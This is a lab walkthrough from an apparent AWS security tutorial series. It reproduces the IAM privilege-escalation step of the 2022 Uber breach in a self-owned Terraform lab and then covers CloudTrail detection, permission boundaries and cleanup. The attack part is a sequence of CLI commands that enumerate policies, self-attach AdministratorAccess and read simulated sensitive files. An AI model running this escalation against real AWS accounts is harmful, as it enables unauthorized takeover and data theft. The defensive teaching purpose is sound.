# How One IAM Misconfiguration Gave an 18-Year-Old Full AWS Access at Uber

**Series: The AWS Autopsy — Real Cloud Breaches, Dissected**
**Difficulty:** Intermediate
**Lab Time:** ~30 minutes
**AWS Cost:** Near zero (IAM + S3 only — free tier eligible)

**GitHub:** [AWS-Autopsy | Case #02](https://github.com/ridamdarji25/AWS-Autopsy)

---

## ⚠️ Legal & Ethical Disclaimer

Read this before proceeding.

This article and the accompanying lab are created strictly for educational and defensive security research purposes.

✅ Run this lab only on AWS infrastructure you personally own

✅ This is intended to help security professionals understand and defend against real attack vectors

❌ Do not use any technique shown here on systems you do not own

❌ Do not use this for any malicious, unauthorized, or illegal activity

❌ Unauthorized access to computer systems is a criminal offense in most countries

By continuing, you agree that you are using this content solely for ethical security research and education.

The author takes no responsibility for any misuse of the information presented in this article.

---

**NOTE : This lab isolates the IAM privilege escalation attack path (iam:AttachUserPolicy wildcard), a documented AWS attack vector relevant to the Uber breach. AWS access via PAM is publicly confirmed. Specific IAM configuration is not claimed.**

---

## The Victim

| Field | Details |
|-------|---------|
| Organisation | Uber Technologies Inc. |
| Date | September 2022 |
| Attacker | 18-year-old, identity later confirmed |
| Data Accessed | S3 PII, financials, HackerOne private reports, Slack, EC2 |
| Root Cause | MFA fatigue + hardcoded PAM credentials + wildcard IAM permissions |
| Attack Cost | $0 |

---

## The Story

Most people think cloud breaches require nation-state tooling, zero-days, or months of reconnaissance.

The Uber 2022 breach required a text message and one AWS CLI command.

In September 2022, an 18-year-old compromised Uber's entire cloud infrastructure. They accessed S3 buckets with rider PII, financial records, EC2 instances across regions, internal Slack workspaces, and most critically — Uber's private HackerOne bug bounty reports, which contained a complete map of every unpatched vulnerability in their systems.

The attack began with MFA fatigue — spamming push notifications until a contractor approved one. That got the attacker inside Uber's VPN. From there, they found a PowerShell automation script on an internal network share with hardcoded credentials to Uber's Privileged Access Manager. PAM held AWS keys. Those keys had one misconfigured IAM permission: `iam:AttachUserPolicy` scoped to `Resource: *`.

One command later, the attacker attached `AdministratorAccess` to themselves.

Then they posted in Uber's `#announcements` Slack channel:

> *"I announce I am a hacker and Uber has suffered a data breach."*

<img width="744" height="440" alt="image" src="https://github.com/user-attachments/assets/d19b468a-c3f0-4761-ab83-2607b650729e" />
***

Employees thought it was a joke. It wasn't.

---

## The Kill Chain

```
[Attacker]
    │
    │  MFA fatigue + IT impersonation via SMS
    ▼
[Contractor's account — VPN access granted]
    │
    │  Browse internal network share
    ▼
[PowerShell script — hardcoded PAM credentials]
    │
    │  Login to Privileged Access Manager
    ▼
[PAM Vault — AWS keys, GCP keys, GSuite admin, Domain Admin]
    │
    │  Use AWS keys → enumerate IAM permissions
    ▼
[IAM User — iam:AttachUserPolicy on Resource: *]
    │
    │  aws iam attach-user-policy --policy-arn AdministratorAccess
    ▼
[Full AdministratorAccess on entire AWS account]
    │
    │  S3, EC2, HackerOne, Slack, internal dashboards
    ▼
[Complete AWS takeover]
```

**Attack Complexity:** LOW
**Preventability:** 100%

---

## Lab Architecture

This lab recreates the IAM privilege escalation vector faithfully:

- **attacker-user** — low-privilege IAM user with a hidden dangerous permission
- **sensitive-bucket** — S3 bucket with simulated PII, financial records, and HackerOne-style vulnerability data
- **public-bucket** — S3 bucket the attacker can legitimately access (starting point)
- **admin-role** — over-permissioned internal service role (escalation target)
- **permission-boundary** — remediation policy ready to apply

The dangerous permission buried in `attacker-user`'s policy:

```json
{
  "Sid": "DANGEROUSAllowPolicyAttach",
  "Effect": "Allow",
  "Action": ["iam:AttachUserPolicy"],
  "Resource": "*"
}
```

This single permission, scoped to `*`, allows the user to attach **any policy** — including `AdministratorAccess` — to **any user**, including themselves.

---

## Prerequisites

- AWS account (free tier works)
- AWS CLI v2 configured (`aws configure`)
- Terraform v1.3+ installed
- Basic familiarity with IAM and S3

---

## Part 1 — Lab Setup

**Clone the repository:**

```bash
git clone https://github.com/ridamdarji25/AWS-Autopsy
cd AWS-Autopsy/Case-02-IAM-PrivEsc-Uber/LabSetup
```
<img width="1153" height="235" alt="image" src="https://github.com/user-attachments/assets/074b5673-e567-42aa-b4e9-782d54ee752c" />
<br>
</br>

**Open `terraform.tfvars` and verify your prefix:**

```hcl
prefix = "yourname"    # ← must be lowercase, no special chars
region = "us-east-1"
```
<img width="739" height="236" alt="image" src="https://github.com/user-attachments/assets/4855bf6c-9e65-45a2-b44a-156037ce33d4" />
<br>
</br>

**Deploy the lab:**

```bash
terraform init
terraform plan
terraform apply
```

Type `yes` when prompted. All IAM users, roles, policies, and S3 buckets will be created in under 30 seconds.

<img width="751" height="148" alt="image" src="https://github.com/user-attachments/assets/ef0bc886-6471-4079-bf3a-c0e3a911920d" />
<br>
</br>

**Note the outputs:**

```
attacker_user_name         = "yourname-attacker-user"
attacker_access_key_id     = "AKIAXXXXXXXXXXXXXXXXX"
admin_role_arn             = "arn:aws:iam::XXXXXXXXXXXX:role/yourname-internal-service-role"
public_bucket_name         = "yourname-public-bucket"
sensitive_bucket_name      = "yourname-sensitive-bucket"
permission_boundary_arn    = "arn:aws:iam::XXXXXXXXXXXX:policy/yourname-permission-boundary"
```

<img width="1261" height="263" alt="image" src="https://github.com/user-attachments/assets/c91a4309-7101-4b37-b4f1-b9f0879e087a" />
<br>
</br>
<img width="1236" height="79" alt="image" src="https://github.com/user-attachments/assets/2a5e703b-1afa-42ef-9f98-bbf1218053ca" />
<br>
</br>

---

## Part 2 — The Attack

> ⚠️ Perform these steps only on your own lab. This is your infrastructure, your account.

### Step 1 — Grab the Attacker Keys

After `terraform apply` completes, pull the credentials from outputs:

```bash
terraform output attacker_access_key_id
terraform output -raw attacker_secret_access_key
```
<img width="1279" height="216" alt="Screenshot 2026-05-13 222544" src="https://github.com/user-attachments/assets/461b53df-658e-4b3a-9e50-df7ff1321824" />
<br>
</br>
Copy both values. You'll need them in the next step.

### Step 2 — Configure the Attacker Profile

```bash
aws configure --profile attacker
# AWS Access Key ID     : (paste attacker_access_key_id)
# AWS Secret Access Key : (paste attacker_secret_access_key)
# Default region name   : us-east-1
# Default output format : json
```
<img width="1093" height="177" alt="Screenshot 2026-05-13 223012" src="https://github.com/user-attachments/assets/07c508da-4d1a-4242-9bc3-66f7b823be2b" />
<br>
</br>
Verify the profile was saved correctly:
<br>
</br>

```bash
aws configure list --profile attacker
```

<img width="995" height="188" alt="image" src="https://github.com/user-attachments/assets/00fb1608-62d5-4330-b586-657df6cee02f" />
<br>
</br>

### Step 3 — Confirm Identity (You Are Nobody)

```bash
aws sts get-caller-identity --profile attacker
```

Expected output:

```json
{
    "UserId": "AIDAXXXXXXXXXXXXXXXXX",
    "Account": "XXXXXXXXXXXX",
    "Arn": "arn:aws:iam::XXXXXXXXXXXX:user/yourname-attacker-user"
}
```

<img width="966" height="185" alt="Screenshot 2026-05-13 223416" src="https://github.com/user-attachments/assets/cfe84066-c3e3-4186-9797-8c64cf03e895" />
<br>
</br>

---

### Step 4 — Try the Sensitive Bucket (Fails)

```bash
aws s3 ls s3://yourname-sensitive-bucket --profile attacker
```

Expected output:

```
An error occurred (AccessDenied) when calling the
ListObjectsV2 operation: Access Denied
```

<img width="1224" height="219" alt="image" src="https://github.com/user-attachments/assets/d0c92881-9c5c-4ce7-8ab5-2d6cf6b887fd" />
<br>
</br>

Confirm your legitimate access works on the public bucket:

```bash
aws s3 ls s3://yourname-public-bucket --profile attacker
```

<img width="855" height="106" alt="image" src="https://github.com/user-attachments/assets/6f995c17-e7a5-4241-9f1d-a021dc2d60a1" />
<br>
</br>

This succeeds and shows `welcome.txt` — the attacker has limited, expected access.

---

### Step 5 — Enumerate Permissions

```bash
aws iam list-attached-user-policies \
  --user-name yourname-attacker-user \
  --profile attacker
```

Expected output:

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "yourname-attacker-policy",
            "PolicyArn": "arn:aws:iam::XXXXXXXXXXXX:policy/yourname-attacker-policy"
        }
    ]
}
```

<img width="1126" height="312" alt="image" src="https://github.com/user-attachments/assets/03bff67c-b3f6-4f42-b151-cfab22800ae8" />
<br>
</br>

Now inspect what that policy actually allows. First get the policy metadata:

```bash
aws iam get-policy \
  --policy-arn arn:aws:iam::XXXXXXXXXXXX:policy/yourname-attacker-policy \
  --profile attacker
```

<img width="1318" height="633" alt="image" src="https://github.com/user-attachments/assets/4ee3e6d9-d8c3-489a-8c86-89afba83b456" />
<br>
</br>

Note the `DefaultVersionId` from the output (typically `v1`), then pull the full policy document:

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::XXXXXXXXXXXX:policy/yourname-attacker-policy \
  --version-id v1 \
  --profile attacker
```

<img width="1303" height="637" alt="image" src="https://github.com/user-attachments/assets/a547800e-57a3-4aec-bfcc-732dc16b3786" />
<br>
</br>

Buried in the statements:

```json
{
    "Sid": "DANGEROUSAllowPolicyAttach",
    "Effect": "Allow",
    "Action": ["iam:AttachUserPolicy"],
    "Resource": "*"
}
```

There it is. `iam:AttachUserPolicy` on `Resource: *`

<img width="529" height="190" alt="image" src="https://github.com/user-attachments/assets/03f0cba2-95ce-4fbc-b1b0-e10296b89356" />
<br>
</br>

---

### Step 6 — THE EXPLOIT

One command. This is the entire attack:

```bash
aws iam attach-user-policy \
  --user-name yourname-attacker-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile attacker
```

No confirmation. No error. Silence is success.

Verify it worked:

```bash
aws iam list-attached-user-policies \
  --user-name yourname-attacker-user \
  --profile attacker
```

Expected output:

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "yourname-attacker-policy",
            "PolicyArn": "arn:aws:iam::XXXXXXXXXXXX:policy/yourname-attacker-policy"
        },
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

<img width="1061" height="409" alt="image" src="https://github.com/user-attachments/assets/b4364410-b7a3-4468-a8f6-4eaabe5148a1" />
<br>
</br>

---

### Step 7 — Access the Sensitive Bucket (Succeeds)

```bash
aws s3 ls s3://yourname-sensitive-bucket --profile attacker
```

Expected output:

```
                           PRE financial/
                           PRE rider-pii/
                           PRE security/
```

<img width="844" height="149" alt="Screenshot 2026-05-13 225014" src="https://github.com/user-attachments/assets/11899989-b089-4754-a062-ed4eda9c8ba6" />
<br>
</br>

Download the financial data:

```bash
aws s3 cp s3://yourname-sensitive-bucket/financial/q3-2022-revenue.txt . \
  --profile attacker

type q3-2022-revenue.txt        # Windows
cat q3-2022-revenue.txt         # Mac/Linux
```

Expected output:

```
CONFIDENTIAL - Q3 2022 Revenue Report
Total Revenue: $8.34B
Net Loss: $-520M
Driver Payouts: $3.1B
[INTERNAL USE ONLY]
```

<img width="1213" height="482" alt="image" src="https://github.com/user-attachments/assets/61556d06-aed3-4111-8609-1d9075b3582e" />
<br>
</br>

Download the vulnerability list:

```bash
aws s3 cp s3://yourname-sensitive-bucket/security/unpatched-vulns.txt . \
  --profile attacker

type unpatched-vulns.txt        # Windows
cat unpatched-vulns.txt         # Mac/Linux
```

Expected output:

```
CRITICAL - Unpatched Vulnerabilities (HackerOne Private)
- CVE-INTERNAL-001: SQL injection in driver portal
- CVE-INTERNAL-002: IDOR in payment API
- CVE-INTERNAL-003: Auth bypass in admin dashboard
[DO NOT SHARE OUTSIDE SECURITY TEAM]
```

<img width="1218" height="328" alt="image" src="https://github.com/user-attachments/assets/316bb78c-2f72-40b3-9b87-b6d31b204f81" />
<br>
</br>

---

### Step 8 — Confirm Full Blast Radius

```bash
# List all IAM users — you can see every identity in the account
aws iam list-users --profile attacker

# List all S3 buckets
aws s3 ls --profile attacker

```

<img width="1001" height="639" alt="image" src="https://github.com/user-attachments/assets/86f34136-3391-4c64-bd36-b19528780006" />
<br>
</br>

**Attack complete.**

| | |
|---|---|
| **Started as** | Low-priv IAM user, zero meaningful access |
| **Used** | 1 misconfigured permission |
| **Ran** | 1 AWS CLI command |
| **Result** | Full AdministratorAccess on entire AWS account |
| **Time taken** | ~15 seconds |

That is exactly what happened at Uber. Minus the MFA fatigue and PowerShell script — the IAM part was identical.

In the Uber incident, this was riders' PII, financial records, and a complete map of every unpatched security vulnerability in their systems.

---

## Part 3 — Detection

What should have caught this?

### CloudTrail — What to Look For

Every IAM action is logged in CloudTrail. Look for:

- `AttachUserPolicy` events called by a non-admin user
- `AttachUserPolicy` where the policy ARN is `AdministratorAccess`
- Any IAM write action from a user that should only have read permissions

### CloudTrail Athena Query

```sql
SELECT
  eventTime,
  userIdentity.arn,
  sourceIPAddress,
  eventName,
  requestParameters
FROM cloudtrail_logs
WHERE
  eventName = 'AttachUserPolicy'
  AND requestParameters LIKE '%AdministratorAccess%'
ORDER BY eventTime DESC
LIMIT 50;
```

Any non-admin user attaching `AdministratorAccess` is an immediate critical alert.

### IAM Access Analyzer

AWS IAM Access Analyzer scans your policies and automatically flags privilege escalation paths — including `iam:AttachUserPolicy` on `Resource: *`.

Enable it in one command:

```bash
aws accessanalyzer create-analyzer \
  --analyzer-name case02-analyzer \
  --type ACCOUNT
```

It would have flagged this misconfiguration before any attacker ever touched it.

---

## Part 4 — Remediation

Three fixes. Applied in order.

### Fix 1 — Remove Wildcard from iam:AttachUserPolicy

**Before (vulnerable):**

```json
{
  "Effect": "Allow",
  "Action": ["iam:AttachUserPolicy"],
  "Resource": "*"
}
```

**After (fixed):**

```json
{
  "Effect": "Allow",
  "Action": ["iam:AttachUserPolicy"],
  "Resource": "arn:aws:iam::XXXXXXXXXXXX:user/specific-allowed-user"
}
```

Never use `Resource: *` for any IAM write action. Scope it to the exact resource it needs.

---

### Fix 2 — Apply a Permission Boundary

Permission boundaries set the **maximum** permissions a user can ever have — regardless of what policies are attached to them. Even if a policy grants `iam:AttachUserPolicy`, the boundary overrides it.

```bash
# Apply the permission boundary (already created by Terraform)
aws iam put-user-permissions-boundary \
  --user-name yourname-attacker-user \
  --permissions-boundary arn:aws:iam::XXXXXXXXXXXX:policy/yourname-permission-boundary
```

The boundary explicitly denies all IAM write actions:

```json
{
  "Sid": "DenyIAMWrite",
  "Effect": "Deny",
  "Action": [
    "iam:AttachUserPolicy",
    "iam:DetachUserPolicy",
    "iam:PutUserPolicy",
    "iam:CreatePolicy",
    "iam:CreatePolicyVersion",
    "iam:PassRole"
  ],
  "Resource": "*"
}
```

### Verify the Fix

First detach the admin policy from the exploit step:

```bash
aws iam detach-user-policy \
  --user-name yourname-attacker-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Now try the exploit again:

```bash
aws iam attach-user-policy \
  --user-name yourname-attacker-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile attacker
```

Expected output:

```
An error occurred (AccessDenied) when calling the
AttachUserPolicy operation: User is not authorized
to perform: iam:AttachUserPolicy
```

Attack path closed.

---

### Fix 3 — Enable IAM Access Analyzer + CloudTrail

```hcl
# accessanalyzer.tf
resource "aws_accessanalyzer_analyzer" "main" {
  analyzer_name = "autopsy-analyzer"
  type          = "ACCOUNT"
}

# cloudtrail.tf
resource "aws_cloudtrail" "autopsy_trail" {
  name                          = "autopsy-trail"
  s3_bucket_name                = aws_s3_bucket.trail_logs.id
  include_global_service_events = true
  is_multi_region_trail         = true
  enable_log_file_validation    = true
}
```

---

## Cleanup — Important

Always destroy lab resources when done:

```bash
# First detach any manually attached policies
aws iam detach-user-policy \
  --user-name yourname-attacker-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Then destroy everything
cd AWS-Autopsy/Case-02-IAM-PrivEsc-Uber/LabSetup
terraform destroy
```

Type `yes` to confirm. All IAM users, roles, policies, and S3 buckets will be removed.

---

## The 3 Lessons from Case #02

**1/ iam:AttachUserPolicy on Resource: * is handing out admin keys**
Any user with this permission can make themselves an administrator in one command. Treat it with the same caution as root access. Scope every IAM write action to explicit resource ARNs. Never use wildcards.

**2/ Permission boundaries are your safety net — and almost nobody uses them**
Policies define what a user can do. Boundaries define the maximum they can ever do. They are the last line of defence when a policy is misconfigured. Deploy them as organisational policy for every non-admin IAM entity.

**3/ Hardcoded credentials are a single file discovery away from full compromise**
A secret in a script is a secret waiting to be stolen. Use AWS Secrets Manager. Use Parameter Store. Run `git-secrets` in your CI pipeline. Rotate credentials regularly. A PAM system with a hardcoded master password is just a longer path to the same place.

---

## What's Next

**Case #03 drops next week:**

Toyota left AWS access keys in a public GitHub repository. For five years. This is how hardcoded secrets in code lead to mass data exposure — and how to detect and prevent it with automated secret scanning.

Follow on [LinkedIn](https://linkedin.com/in/ridamdarji) and [GitHub](https://github.com/ridamdarji25) so you don't miss it.

⭐ Star the repo → [github.com/ridamdarji25/AWS-Autopsy](https://github.com/ridamdarji25/AWS-Autopsy)

---

## References

- [Uber Security Update — September 2022](https://www.uber.com/newsroom/security-update)
- [AWS IAM Permission Boundaries Documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html)
- [IAM Access Analyzer Documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/what-is-access-analyzer.html)
- [AWS IAM Privilege Escalation Research — Rhino Security Labs](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation)
- [MITRE ATT&CK — Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)

---

*The AWS Autopsy is an educational series on real cloud security incidents. Every technique demonstrated is for defensive security research only. Always obtain proper authorisation before testing any system you do not own.*

*Found this useful? Share it with your team. Every AWS engineer should understand IAM privilege escalation.*

**Tags:** aws cloud-security iam privilege-escalation terraform devsecops security-research uber ethical-hacking

`#aws` `#cloud-security` `#iam` `#devsecops` `#terraform` `#cybersecurity` `#privilege-escalation` `#security-research`
